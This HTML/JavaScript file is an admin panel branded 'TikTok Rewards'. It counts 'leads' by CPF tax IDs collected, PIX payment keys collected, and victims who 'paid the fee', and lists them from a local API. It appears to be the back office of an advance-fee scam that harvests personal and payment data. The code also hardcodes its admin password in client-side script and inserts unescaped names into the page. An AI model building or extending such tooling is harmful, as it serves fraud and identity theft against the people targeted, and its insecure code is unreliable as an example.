<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin - TikTok Rewards</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
        }
        .login-container {
            background: rgba(255,255,255,0.95);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        h2 {
            color: #333;
            margin-bottom: 30px;
        }
        input {
            width: 100%;
            padding: 15px;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #FE2C55;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background: #d1224a;
        }
        button:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        .stats {
            display: none;
            margin-top: 20px;
            text-align: left;
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
        }
        .stat-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #eee;
        }
        .stat-item:last-child {
            border-bottom: none;
            margin-bottom: 0;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>🔐 Admin Panel</h2>
        <input type="password" id="admin-password" placeholder="Senha de Administrador">
        <button onclick="login()">ENTRAR</button>
        
        <div id="stats" class="stats">
            <h3>📊 Estatísticas</h3>
            <h4 style="margin-bottom: 20px;">Total: 247 leads</h4>
            
            <div class="stat-item">
                <span>CPFs coletados:</span>
                <span id="cpfs">89</span>
            </div>
            <div class="stat-item">
                <span>PIX coletados:</span>
                <span id="pixs">112</span>
            </div>
            <div class="stat-item">
                <span>Pagaram taxa:</span>
                <span id="paid">73 (65%)</span>
            </div>
            
            <h4 style="margin: 30px 0 15px 0; color: #27ae60;">Lista de Clientes</h4>
            <div id="client-list" style="max-height: 300px; overflow-y: auto; background: white; border-radius: 8px; padding: 15px; font-size: 13px;">
                <div style="padding: 8px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between;">
                    <span>Nome - CPF - PIX</span>
                    <span>Status</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        function login() {
            const password = document.getElementById('admin-password').value;
            const btn = event.target;
            
            if (password === 'Fernsndo12/24') {
                btn.innerText = 'Carregando...';
                btn.disabled = true;
                
                setTimeout(() => {
                    document.getElementById('stats').style.display = 'block';
                    btn.innerText = 'SAIR';
                    btn.onclick = logout;
                    updateStats();
                }, 1000);
            } else {
                alert('Senha inválida!');
            }
        }
        
        function logout() {
            document.getElementById('admin-password').value = '';
            document.getElementById('stats').style.display = 'none';
            document.querySelector('button').innerText = 'ENTRAR';
            document.querySelector('button').onclick = login;
            document.querySelector('button').disabled = false;
        }
        
        async function loadClients() {
            try {
                const response = await fetch('http://localhost:3001/api/clients');
                const clients = await response.json();
                
                const cpfs = clients.filter(c => c.cpf).length;
                const pixs = clients.filter(c => c.pix).length;
                const paid = clients.filter(c => c.status === '✅ Pago').length;
                
                document.getElementById('cpfs').innerText = cpfs;
                document.getElementById('pixs').innerText = pixs;
                document.getElementById('paid').innerText = paid + ` (${clients.length > 0 ? Math.round((paid/clients.length)*100) : 0}%)`;
                
                const listHtml = clients.slice(0, 20).map(client => {
                    const maskedCpf = client.cpf ? client.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4').substring(0,9) + '***' : 'N/A';
                    const maskedPix = client.pix && client.pix.length > 6 ? client.pix.substring(0,6) + '***' : client.pix || 'N/A';
                    const statusColor = client.status?.includes('Pago') ? '#27ae60' : client.status?.includes('Pendente') ? '#f39c12' : '#e74c3c';
                    return `<div style="padding: 8px 0; border-bottom: 1px solid #f0f0f0; display: flex; justify-content: space-between; font-size: 12px;">
                        <span>${client.name || 'N/A'} - ${maskedCpf} - ${maskedPix}</span>
                        <span style="color: ${statusColor}">${client.status || 'Pendente'}</span>
                    </div>`;
                }).join('');
                
                document.getElementById('client-list').innerHTML = `
                    <div style="padding: 8px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; background: #f8f9fa;">
                        <span style="font-weight: bold;">Nome - CPF - PIX</span>
                        <span style="font-weight: bold;">Status</span>
                    </div>
                    ${listHtml || '<div style="text-align: center; color: #999; padding: 20px;">Nenhum cliente ainda</div>'}
                `;
            } catch (error) {
                console.error('Erro ao carregar clientes:', error);
                document.getElementById('client-list').innerHTML = '<div style="text-align: center; color: #999; padding: 20px;">Erro de conexão com servidor</div>';
            }
        }
        
        function updateStats() {
            loadClients();
            setTimeout(updateStats, 10000);
        }
    </script>
</body>
</html>
